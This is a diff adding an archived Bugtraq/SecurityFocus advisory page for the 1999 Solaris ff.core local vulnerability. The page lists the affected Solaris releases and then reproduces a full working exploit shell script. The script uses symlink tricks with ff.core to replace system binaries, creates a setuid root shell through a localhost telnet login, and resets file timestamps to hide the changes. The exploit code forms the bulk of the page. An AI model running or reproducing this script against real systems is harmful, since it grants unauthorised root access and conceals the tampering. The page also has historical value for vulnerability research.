@@ -1,0 +1,116 @@
+<p><b><span style="font-size: 18pt;">Solaris ff.core Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/327/info">info</a><br><a href="http://www.securityfocus.com/bid/327/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/327/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/327/solution">solution</a><br><a href="http://www.securityfocus.com/bid/327/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				327
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Access Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jan 07 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jan 07 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This bug was posted to the Bugtraq mailing list by John McDonald &lt;jmcdonal@UNF.EDU&gt; Thu, 7 Jan 1999.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Sun Solaris 2.5.1 _x86<br/>
+					
+				
+					Sun Solaris 2.5.1 <br/>
+					
+				
+					Sun Solaris  7.0_x86<br/>
+					
+				
+					Sun Solaris  7.0<br/>
+					
+				
+					Sun Solaris  2.6_x86<br/>
+					
+				
+					Sun Solaris  2.6<br/>
+					
+				
+					Sun Solaris  2.5_x86<br/>
+					
+				
+					Sun Solaris  2.5<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	CORE has developed a working commercial exploit for their IMPACT product. This exploit is not otherwise publicly available or known to be circulating in the wild.<br/><br/>The following exploit was provided:<br/><br/>#!/bin/sh<br/><br/>    # /usr/openwin/bin/ff.core exploit - horizon<br/>    # tested on 2.5.1, 2.6 and Solaris 7 (2.7)<br/>    # thanks to joej, adm, and joej :&gt;<br/><br/>    # if you want to exploit 2.5, you can just make this move /etc/group over<br/>    # /etc/shadow. you will probably want to move /etc/shadow to /etc/s.bak<br/><br/>    # first test if we can pull this off<br/><br/>    echo "Testing if exploit is possible..."<br/><br/>    if  -x /usr/openwin/bin/ff.core <br/>    then<br/>            :<br/>    else<br/>            echo "ff.core isn't there or executable. :/"<br/>            exit 1<br/>    fi<br/><br/>    if  -w /vol/rmt <br/>    then<br/>            :<br/>    else<br/>            echo "We can't do the symlink. :&lt;"<br/>            exit 1<br/>    fi<br/><br/>    mkdir /tmp/.test42<br/>    touch /tmp/.test42/bob<br/><br/>    rm -f /vol/rmt/diskette0<br/>    ln -fs /tmp/.test42 /vol/rmt/diskette0<br/>    /usr/openwin/bin/ff.core -r /vol/rmt/diskette0/bob jim /floppy/ 2&gt;/dev/null<br/><br/>    if  -f /tmp/.test42/jim <br/>    then<br/>            echo "Test successful. Proceeding..."<br/>    else<br/>            echo "Hmmm.. doesn't look like this is going to work :/"<br/>            exit 1<br/>    fi<br/><br/>    rm -rf /tmp/.test42<br/><br/>    # lets make some backups<br/><br/>    echo "Backing up clobbered files to /tmp/.bk"<br/><br/>    mkdir /tmp/.bk<br/>    #save admintools times<br/>    touch /tmp/.bk/admintool<br/>    touch -r /usr/bin/admintool /tmp/.bk/admintool<br/>    #save rloginds times<br/>    touch /tmp/.bk/in.rlogind<br/>    touch -r /usr/sbin/in.rlogind /tmp/.bk/in.rlogind<br/>    #save a copy of /usr/bin/sh<br/>    cp /usr/bin/sh /tmp/.bk<br/>    touch -r /usr/bin/sh /tmp/.bk/sh<br/><br/>    echo "Doing sploit..."<br/><br/>    rm -f /vol/rmt/diskette0<br/>    ln -fs /usr/bin /vol/rmt/diskette0<br/>    /usr/openwin/bin/ff.core -r /vol/rmt/diskette0/admintool admintool.bak /floppy/ 2&gt;/dev/null<br/><br/>    rm -f /vol/rmt/diskette0<br/>    ln -fs /usr/bin /vol/rmt/diskette0<br/>    /usr/openwin/bin/ff.core -r /vol/rmt/diskette0/sh admintool /floppy/ 2&gt;/dev/null<br/><br/>    rm -f /vol/rmt/diskette0<br/>    ln -fs /usr/sbin /vol/rmt/diskette0<br/>    /usr/openwin/bin/ff.core -r /vol/rmt/diskette0/in.rlogind in.rlogind.bak /floppy/ 2&gt;/dev/null<br/><br/>    rm -f /vol/rmt/diskette0<br/>    ln -fs /usr/sbin /vol/rmt/diskette0<br/>    /usr/openwin/bin/ff.core -r /vol/rmt/diskette0/swmtool in.rlogind /floppy/ 2&gt;/dev/null<br/><br/>    echo "Done with sploit. Testing and trying to clean up now..."<br/><br/>    sleep 1<br/><br/>    (sleep 2;echo "    cp /bin/rksh /tmp/bob;    chmod 4755 /tmp/bob;    exit;    ") | telnet localhost login<br/><br/>    sleep 1<br/><br/>    if  -f /tmp/bob <br/>    then<br/>            echo "w00p! Should have a suid root sh in /tmp/bob"<br/>            echo "btw, its rksh because solaris is silly"<br/>            echo "Let me try to clean up my mess..."<br/>    else<br/>            echo "hrmmph.. didnt work. hope shits not screwed up bad :/"<br/>            exit 1<br/>    fi<br/><br/>    echo "<br/>    cp /tmp/.bk/sh /usr/bin/sh<br/>    chmod 555 /usr/bin/sh<br/>    chown bin /usr/bin/sh<br/>    chgrp root /usr/bin/sh<br/>    touch -r /tmp/.bk/sh /usr/bin/sh<br/>    mv /usr/bin/admintool.bak /usr/bin/admintool<br/>    touch -r /tmp/.bk/admintool /usr/bin/admintool<br/>    rm -f /usr/sbin/swmtool<br/>    ln -s /usr/bin/admintool /usr/sbin/swmtool<br/>    touch -r /usr/bin/admintool /usr/sbin/swmtool<br/>    rm -f /usr/sbin/in.rlogind<br/>    mv /usr/sbin/in.rlogind.bak /usr/sbin/in.rlogind<br/>    touch -r /tmp/.bk/in.rlogind /usr/sbin/in.rlogind<br/>    rm -rf /tmp/.bk<br/>    " | /tmp/bob<br/><br/>    echo "everything should be cool.. i think :&gt;"<br/>    /tmp/bob
+	
+		<ul>
+</ul>
+</div>
